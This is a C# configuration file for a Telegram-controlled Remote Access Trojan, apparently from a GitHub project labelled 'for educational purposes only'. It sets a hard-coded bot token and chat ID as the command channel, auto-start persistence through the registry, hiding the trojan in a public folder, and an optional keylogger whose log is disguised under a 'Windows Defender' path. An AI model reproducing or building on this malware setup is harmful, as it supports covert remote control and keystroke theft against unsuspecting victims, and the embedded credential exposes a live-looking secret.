namespace RAT_BotTelegram {
    internal sealed class config {

        //          |>Solo fines educativos<|
        //          https://github.com/SebastianEPH/RAT_BotTelegram.git
        //          Developed by SebastiánEPH

        // Configuración Inicio
        public const string TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8";  // Token Bot
        public const string ID = "831756903";                                          // ID Chat

        // Config Trojan
        public const bool   STARTUP = true;         // Se inicia automaticamente al iniciar sesión
        public const bool   TROJAN = true;          // Se oculta en el sistema
        public const int    DELAY = 1;              // Delay despues de iniciar el sistema // Para computadoras sin SSD // Segundos
        public const bool   CONSOLE_DEBUG = false;   // Modo debug =>> Muestra consola al ejecutarse

        // Config de Trojan // No cambiar si no cambiaste el nombre del troyano
        // Esta información la encuentras en la carpeta = @"RAT TelegramSpyBot\bin\Debug"
        public const string NAME_EXE = "RAT TelegramSpyBot.exe";    // Nombre exe // No cambiar
        public const string NAME_REG = "RAT TelegramSpyBot";    // Nombre del RAT en el registro, puedes cambiar el nombre
        public const string PATH_OCUL = @"C:\Users\Public\RAT_Telegram";      // Ruta donde se esconde //@"C:\Users\Public\Public Config\Windows\Security\RAT_Telegram"

        //Config Keylogger 
        public const bool   KEYLOGGER   = false;                             // True = Keylogger activo  // False = Keylogger deshabilitado
        public const string PATH_LOG    = @"C:\Users\Public\Security\Windows Defender";  // Ruta donde se guardará el registro de teclas
        public const string LOG         = "reg.k";                          //Archivo registro.                   
        public const string PATH_KEY    = PATH_LOG+ @"\"+LOG;
    }
}
